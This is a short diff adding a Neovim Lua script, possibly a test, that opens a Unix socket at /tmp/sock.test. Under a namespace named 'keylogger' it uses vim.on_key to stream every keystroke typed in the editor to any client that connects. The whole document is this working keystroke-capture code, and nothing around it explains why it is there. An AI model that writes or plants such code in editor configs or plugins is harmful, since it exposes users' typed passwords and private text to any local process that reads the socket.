@@ -1,0 +1,11 @@
+local uv = vim.loop
+local pipe = uv.new_pipe(false)
+pipe:bind('/tmp/sock.test')
+local ns = vim.api.nvim_create_namespace("keylogger")
+pipe:listen(128, function()
+    local client = uv.new_pipe(false)
+    pipe:accept(client)
+    vim.on_key(function (text)
+        client:write(text.."\n")
+    end, ns)
+end)
